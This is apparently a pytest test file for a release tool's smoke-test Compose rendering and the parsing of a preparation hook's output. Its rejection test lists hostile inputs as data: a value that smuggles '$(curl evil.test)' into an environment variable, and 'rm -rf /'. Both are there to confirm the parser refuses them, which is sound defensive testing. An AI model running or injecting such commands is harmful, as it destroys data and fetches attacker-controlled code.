"""Centrally implemented smoke profiles and the bounded preparation hook."""

from __future__ import annotations

import json
import os
import shutil
import subprocess
from pathlib import Path
from typing import Any

import pytest
import yaml

from genefoundry_router.release.models import ReleaseConfig
from genefoundry_router.release.smoke import parse_smoke_env, render_smoke_override

_IMAGE = "app-ci:abcdef"


def _config(**overrides: Any) -> ReleaseConfig:
    document: dict[str, Any] = {
        "service": {"name": "app", "compose_files": ["docker/docker-compose.yml"]},
        "definitions": {"contract": "data-independent"},
    }
    return ReleaseConfig.model_validate(document | overrides)


def _bundle_config() -> ReleaseConfig:
    return _config(
        service={
            "name": "app",
            "compose_files": ["docker/docker-compose.yml"],
            "auxiliary": [
                {
                    "name": "app-data-init",
                    "role": "init",
                    "egress": "denied",
                    "writable_targets": ["/var/lib/app/reference"],
                }
            ],
        },
        data={
            "mode": "external-reference",
            "release_tag": "data-2026-07-13",
            "digest": f"sha256:{'a' * 64}",
        },
        definitions={"contract": "data-bound"},
        smoke={"profile": "immutable-bundle"},
        preparation="docker/ci-prepare-smoke.sh",
    )


def _postgres_config() -> ReleaseConfig:
    return _config(
        service={
            "name": "app",
            "compose_files": ["docker/docker-compose.yml"],
            "networks": ["default"],
            "auxiliary": [
                {
                    "name": "postgres",
                    "role": "database",
                    "egress": "approved-networks",
                    "writable_targets": ["/var/lib/postgresql"],
                    "healthcheck_test": ["CMD-SHELL", "pg_isready"],
                }
            ],
        },
        data={
            "mode": "restored-database",
            "release_tag": "corpus-2026-07-13",
            "digest": f"sha256:{'b' * 64}",
        },
        definitions={"contract": "data-bound"},
        smoke={"profile": "postgres-bundle"},
    )


def _render(config: ReleaseConfig, **kwargs: Any) -> dict[str, Any]:
    text = render_smoke_override(config, image=_IMAGE, host_port=18000, **kwargs)
    # The Compose merge tags are opaque to a plain YAML loader; strip them for shape checks.
    return yaml.safe_load(text.replace("!reset ", "").replace("!override", ""))


# --- the preparation hook ----------------------------------------------------------------------


def test_preparation_output_is_parsed_never_sourced() -> None:
    assert parse_smoke_env("# fixture\nAPP_SHA256=abc\nAPP_PATH=/fixtures/app.zst\n") == {
        "APP_SHA256": "abc",
        "APP_PATH": "/fixtures/app.zst",
    }


@pytest.mark.parametrize(
    "text",
    [
        "export APP_SHA256=abc",
        "APP_SHA256=$(curl evil.test)\nrm -rf /",
        "rm -rf /",
        "app_sha256=abc",
        "APP_SHA256=abc\nAPP_SHA256=def",
        "APP=" + "x" * 5_000,
    ],
)
def test_preparation_output_rejects_anything_but_key_value(text: str) -> None:
    with pytest.raises(ValueError, match="smoke environment"):
        parse_smoke_env(text)


def test_preparation_is_restricted_to_one_reviewable_path() -> None:
    with pytest.raises(ValueError, match="preparation"):
        _config(preparation="docker/evil.sh")


# --- profile: compose --------------------------------------------------------------------------


def test_compose_profile_renders_only_the_application() -> None:
    document = _render(_config())

    assert set(document["services"]) == {"app"}
    assert document["services"]["app"]["image"] == _IMAGE
    assert document["services"]["app"]["pull_policy"] == "never"


def test_every_profile_reapplies_the_hardening_invariants() -> None:
    service = _render(_bundle_config())["services"]["app-data-init"]

    assert service["read_only"] is True
    assert service["cap_drop"] == ["ALL"]
    assert service["security_opt"] == ["no-new-privileges:true"]
    assert service["deploy"]["resources"]["limits"]["pids"] == 256
    assert "ports" not in service


# --- profile: immutable-bundle -----------------------------------------------------------------


def test_immutable_bundle_profile_starts_the_declared_init_sidecar() -> None:
    document = _render(_bundle_config())

    assert set(document["services"]) == {"app", "app-data-init"}
    sidecar = document["services"]["app-data-init"]
    assert sidecar["image"] == _IMAGE
    assert sidecar["pull_policy"] == "never"
    assert sidecar["restart"] == "no"


def test_prepared_fixture_environment_reaches_both_services() -> None:
    document = _render(_bundle_config(), environment={"APP_DATA_SHA256": "abc"})

    assert document["services"]["app"]["environment"]["APP_DATA_SHA256"] == "abc"
    assert document["services"]["app-data-init"]["environment"]["APP_DATA_SHA256"] == "abc"


def test_a_sidecar_profile_without_a_declared_sidecar_fails_closed() -> None:
    config = _config(smoke={"profile": "immutable-bundle"})

    with pytest.raises(ValueError, match="requires a declared sidecar"):
        render_smoke_override(config, image=_IMAGE, host_port=18000)


# --- profile: postgres-bundle ------------------------------------------------------------------


def test_postgres_bundle_keeps_the_database_upstream_image() -> None:
    document = _render(_postgres_config())

    assert set(document["services"]) == {"app", "postgres"}
    database = document["services"]["postgres"]
    # The database is NOT the application image; overriding it would break the stack
    # and pinning `pull_policy: never` would stop Compose pulling its digest.
    assert "image" not in database
    assert "pull_policy" not in database
    assert database["read_only"] is True


# --- the rendered override must be real, executable Compose -------------------------------------


def test_rendered_override_is_accepted_by_docker_compose(tmp_path: Path) -> None:
    docker = shutil.which("docker")
    assert docker is not None
    override = tmp_path / "compose.container-ci.yml"
    config = ReleaseConfig.model_validate(json.loads(Path("container-release.json").read_text()))
    override.write_text(
        render_smoke_override(config, image=_IMAGE, host_port=18000), encoding="utf-8"
    )
    env = os.environ | {"GENEFOUNDRY_IMAGE": _IMAGE}

    completed = subprocess.run(  # noqa: S603
        [
            docker,
            "compose",
            "-f",
            "docker/docker-compose.yml",
            "-f",
            str(override),
            "config",
            "--format",
            "json",
        ],
        check=True,
        capture_output=True,
        text=True,
        env=env,
    )
    rendered = json.loads(completed.stdout)
    service = rendered["services"]["genefoundry-router"]

    assert "build" not in service
    assert service["image"] == _IMAGE
    assert service["pull_policy"] == "never"
    assert service["read_only"] is True
    assert service["cap_drop"] == ["ALL"]
    assert service["security_opt"] == ["no-new-privileges:true"]
    assert service["ports"][0]["published"] == "18000"
    assert service["ports"][0]["host_ip"] == "127.0.0.1"
